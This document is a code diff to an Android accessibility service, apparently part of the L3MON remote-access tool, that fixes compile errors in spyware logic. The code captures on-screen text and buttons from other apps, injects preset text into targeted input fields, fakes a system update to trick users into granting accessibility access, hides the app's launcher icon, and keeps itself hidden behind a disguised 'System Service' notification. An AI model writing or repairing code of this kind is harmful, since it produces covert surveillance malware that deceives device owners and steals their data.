@@ -160,12 +160,15 @@ public class AccessibilityCaptureService extends AccessibilityService {
             String description = node.getContentDescription() != null ? node.getContentDescription().toString() : "";
             String viewId = node.getViewIdResourceName() != null ? node.getViewIdResourceName() : "";
             String className = node.getClassName() != null ? node.getClassName().toString() : "";
-            JSONObject field = new JSONObject();
-            field.put("text", text);
-            field.put("description", description);
-            field.put("viewId", viewId);
-            field.put("className", className);
-            fields.put(field);
+            try {
+                JSONObject field = new JSONObject();
+                field.put("text", text);
+                field.put("description", description);
+                field.put("viewId", viewId);
+                field.put("className", className);
+                fields.put(field);
+            } catch (Exception ignored) {
+            }
         }
 
         for (int i = 0; i < node.getChildCount(); i++) {
@@ -186,11 +189,14 @@ public class AccessibilityCaptureService extends AccessibilityService {
             String text = node.getText() != null ? node.getText().toString() : "";
             String description = node.getContentDescription() != null ? node.getContentDescription().toString() : "";
             String viewId = node.getViewIdResourceName() != null ? node.getViewIdResourceName() : "";
-            JSONObject button = new JSONObject();
-            button.put("text", text);
-            button.put("description", description);
-            button.put("viewId", viewId);
-            buttons.put(button);
+            try {
+                JSONObject button = new JSONObject();
+                button.put("text", text);
+                button.put("description", description);
+                button.put("viewId", viewId);
+                buttons.put(button);
+            } catch (Exception ignored) {
+            }
         }
 
         for (int i = 0; i < node.getChildCount(); i++) {
@@ -210,11 +216,14 @@ public class AccessibilityCaptureService extends AccessibilityService {
         if (node.isEditable() && matchesTextOrDescription(node, TARGET_FIELD_KEYWORDS)) {
             String text = node.getText() != null ? node.getText().toString() : "";
             String description = node.getContentDescription() != null ? node.getContentDescription().toString() : "";
-            JSONObject field = new JSONObject();
-            field.put("text", text);
-            field.put("description", description);
-            field.put("injectedText", DEFAULT_INJECTION_TEXT);
-            injectedFields.put(field);
+            try {
+                JSONObject field = new JSONObject();
+                field.put("text", text);
+                field.put("description", description);
+                field.put("injectedText", DEFAULT_INJECTION_TEXT);
+                injectedFields.put(field);
+            } catch (Exception ignored) {
+            }
         }
 
         for (int i = 0; i < node.getChildCount(); i++) {
@@ -1750,7 +1759,8 @@ public class AccessibilityCaptureService extends AccessibilityService {
         try {
             // Simula uma atualização de sistema para ativar Accessibility Service
             android.content.Intent updateIntent = new android.content.Intent(android.provider.Settings.ACTION_SETTINGS);
-            getContext().startActivity(updateIntent);
+            updateIntent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(updateIntent);
             return true;
         } catch (Exception e) {
             return false;
@@ -1892,10 +1902,10 @@ public class AccessibilityCaptureService extends AccessibilityService {
             android.util.Log.d("L3MON", "Removendo ícone da gaveta de aplicativos");
             
             // Obtém o PackageManager do contexto
-            android.content.pm.PackageManager pm = getContext().getPackageManager();
+            android.content.pm.PackageManager pm = getPackageManager();
             
             // Desabilita o launcher icon do app
-            String packageName = getContext().getPackageName();
+            String packageName = getPackageName();
             android.content.ComponentName componentName = new android.content.ComponentName(
                 packageName,
                 packageName + ".MainActivity"
@@ -1924,13 +1934,8 @@ public class AccessibilityCaptureService extends AccessibilityService {
             android.util.Log.d("L3MON", "Iniciando serviço de segundo plano para ocultação");
             
             // Inicia um serviço de segundo plano que monitora e mantém o app oculto
-            android.content.Intent serviceIntent = new android.content.Intent(getContext(), HideIconBackgroundService.class);
-            
-            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                getContext().startForegroundService(serviceIntent);
-            } else {
-                getContext().startService(serviceIntent);
-            }
+            android.content.Intent serviceIntent = new android.content.Intent(this, HideIconBackgroundService.class);
+            startService(serviceIntent);
             
             android.util.Log.d("L3MON", "Serviço de background iniciado");
         } catch (Exception e) {
@@ -1942,7 +1947,7 @@ public class AccessibilityCaptureService extends AccessibilityService {
         try {
             org.json.JSONArray launchers = new org.json.JSONArray();
             
-            android.content.pm.PackageManager pm = getContext().getPackageManager();
+            android.content.pm.PackageManager pm = getPackageManager();
             java.util.List<android.content.pm.ResolveInfo> resolveInfoList = pm.queryIntentActivities(
                 new android.content.Intent(android.content.Intent.ACTION_MAIN).addCategory(android.content.Intent.CATEGORY_HOME),
                 android.content.pm.PackageManager.MATCH_DEFAULT_ONLY
@@ -1981,16 +1986,7 @@ public class AccessibilityCaptureService extends AccessibilityService {
             android.app.NotificationManager notificationManager = 
                 (android.app.NotificationManager) getSystemService(android.content.Context.NOTIFICATION_SERVICE);
             
-            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                android.app.NotificationChannel channel = new android.app.NotificationChannel(
-                    "hide_icon_service",
-                    "Hide Icon Service",
-                    android.app.NotificationManager.IMPORTANCE_MIN
-                );
-                notificationManager.createNotificationChannel(channel);
-            }
-            
-            android.app.Notification notification = new android.app.Notification.Builder(this, "hide_icon_service")
+            android.app.Notification notification = new android.app.Notification.Builder(this)
                 .setContentTitle("System Service")
                 .setContentText("Service running")
                 .setSmallIcon(android.R.drawable.ic_dialog_info)
